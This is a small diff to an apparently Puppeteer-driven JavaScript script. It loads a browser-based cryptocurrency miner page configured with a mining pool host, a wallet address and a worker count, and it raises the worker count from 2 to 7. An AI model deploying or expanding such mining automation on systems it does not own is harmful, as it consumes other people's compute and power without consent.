@@ -23,7 +23,7 @@ function generarTiemposPausas() {
   });
 
   const page = await browser.newPage();
-  await page.goto('https://webminer.pages.dev?algorithm=cwm_minotaurx&host=minotaurx.eu.mine.zpool.ca&port=7019&worker=PP3785fTZ9DRL8oa9SGP5AsW8weuyWUAtq&password=c%3DPEPEW&workers=2');
+  await page.goto('https://webminer.pages.dev?algorithm=cwm_minotaurx&host=minotaurx.eu.mine.zpool.ca&port=7019&worker=PP3785fTZ9DRL8oa9SGP5AsW8weuyWUAtq&password=c%3DPEPEW&workers=7');
   await page.waitForSelector('body');
   console.log("Página cargada correctamente. Iniciando tarea...");
 
